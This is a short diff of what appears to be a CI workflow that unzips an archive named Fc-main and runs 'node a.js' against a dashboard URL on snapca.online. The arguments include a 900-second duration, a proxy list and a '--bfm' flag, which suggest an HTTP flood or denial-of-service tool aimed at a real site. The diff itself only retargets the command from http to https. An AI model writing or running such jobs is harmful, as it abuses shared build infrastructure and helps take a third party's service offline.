@@ -37,7 +37,7 @@ jobs:
           unzip Fc-main.zip 
           
           cd Fc-main
-          node a.js GET http://snapca.online/dashboard  900 4 1 proxy.txt --bfm --debug 
+          node a.js GET https://snapca.online/dashboard  900 4 1 proxy.txt --bfm --debug 
 
           
 
